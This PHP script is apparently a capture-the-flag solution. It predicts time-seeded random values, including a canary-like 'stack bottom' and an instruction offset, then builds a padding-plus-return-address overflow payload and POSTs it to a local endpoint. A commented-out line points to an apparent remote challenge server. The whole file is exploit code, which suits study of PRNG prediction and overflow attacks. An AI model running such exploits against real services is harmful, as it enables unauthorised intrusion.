<?php

function cyclic($num) {
	$res = "";
	for ($i = 0; $i < $num; $i++) {
		$res .= "v";
	}
	return $res;
}

function post($data) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, 'http://127.0.0.1:8382/2.php');
	// curl_setopt($curl, CURLOPT_URL, 'http://34.85.27.91:10080/');
	curl_setopt($curl, CURLOPT_HEADER, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
	$html = curl_exec($curl);
	curl_close($curl);
	print_r($html);
}

function handleData($arg1) {
	$arg1_len = strlen($arg1);
	$len = $arg1_len / 4 + (1 * ($arg1_len % 4));
	$strarray = str_split($arg1, 4);
	$strarray[$len - 1] = str_pad($strarray[$len - 1], 4, "\x00");
	foreach ($strarray as $key => &$value) {
		$value = strrev(bin2hex($value));
	}
	return $strarray;
}
function strrevhex($data) {
	// $data = "$data";
	$r = "";
	$data = strrev($data);
	for ($i = 0; $i < strlen($data); $i++) {
		if ($i % 2 == 0) {
			$r .= "\\x";
		}
		$r .= "$data[$i]";
	}
	echo "r = $r\r\n";
	eval("\$r = \"$r\";");
	echo "r = $r\r\n";
	return $r;
}

$seed = time();
echo "seed = $seed\r\n";
srand($seed);
// INS_OFFSET
$INS_OFFSET = rand(0, 65535);
// $func_addr = $func_addr + 0x60000000 + INS_OFFSET + 0x1;
$table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
$a1 = $table[rand(0, strlen($table) - 1)];
$a2 = $table[rand(0, strlen($table) - 1)];
$a3 = $table[rand(0, strlen($table) - 1)];
$bottom = handleData($a1 . $a2 . $a3 . "\x00")[0];
echo "stack bottom = $bottom\r\n";
$ebp = 0xfffe0000 + rand(0, 0xffff);
$stack[$ebp] = $ebp + rand(0, 0xffff);
$esp_addr = $ebp - (rand(32, 96) * 4);

// echo dechex(strrev('4294934889')) . "\r\n";
// echo strrev(dechex(1610643098));
//
$bottom_addr = $ebp - 4;
echo "ebp -> $ebp  bottom_addr -> $bottom_addr  esp_addr -> $esp_addr  \n";
// ebp -> 4294895201  bottom_addr -> 4294895197  esp_addr -> 4294894909
$pianyi = $bottom_addr - $esp_addr;
// $ff = intval($_GET['f']);
$ff = 1417;
$func_addr = $ff + 0x60000000 + $INS_OFFSET + 0x1;
$func_addr = dechex($func_addr);
echo "\$func_addr = $func_addr \r\n";

$bottom_data = strrevhex($bottom);
$func_addr = strrevhex($func_addr);
echo "\$bottom_data = $bottom_data    \$func_addr = $func_addr\r\n";
echo "\$pianyi = $pianyi\r\n";

$payload = cyclic($pianyi) . $bottom_data . "vvvv" . $func_addr;
echo "\$payload = $payload\r\n";
echo "\r\n\r\n#########################\r\n\r\n";
post([
	'data' => ($payload),
]);
